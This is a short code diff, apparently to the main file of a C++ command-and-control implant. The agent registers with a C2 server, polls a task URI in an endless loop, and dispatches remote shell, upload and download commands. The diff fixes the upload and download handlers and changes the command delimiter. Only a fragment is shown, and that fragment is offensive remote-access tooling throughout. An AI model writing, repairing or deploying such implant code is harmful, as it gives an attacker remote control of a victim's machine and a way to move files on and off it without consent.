@@ -14,7 +14,7 @@
 
 #pragma comment(lib, "winhttp.lib")
 
-std::vector <std::string> split(std::string cmd, char delimiter = ' ');
+std::vector <std::string> split(std::string cmd, char delimiter = '|');
 
 int main()
 {
@@ -25,11 +25,12 @@ int main()
 
 	agent.Register(C2_IP, C2_PORT);
 
-	cmdHandler.RegisterCommand(UPLOAD_CMD, std::bind(&Agent::shell, std::placeholders::_1));
-	cmdHandler.RegisterCommand(DOWNLOAD_CMD, std::bind(&Agent::shell, std::placeholders::_1));
+	cmdHandler.RegisterCommand(UPLOAD_CMD, std::bind(&Agent::upload, std::placeholders::_1));
+	cmdHandler.RegisterCommand(DOWNLOAD_CMD, std::bind(&Agent::download, std::placeholders::_1));
 	cmdHandler.RegisterCommand(SHELL_CMD, std::bind(&Agent::shell, std::placeholders::_1));
 	//cmdHandler.RegisterCommand(POWERSHELL_CMD, std::bind(&Agent::powershell, agent));
-	//cmdHandler.RegisterCommand(PSIMPORT_CMD, std::bind(&Agent::ps-import, agent));
+	//cmdHandler.RegisterCommand(PSIMPORT_CMD, std::bind(&Agent::psimport, agent));
+
 
 	while (true) {
 		std::string task = agent.Get(TASK_URI);
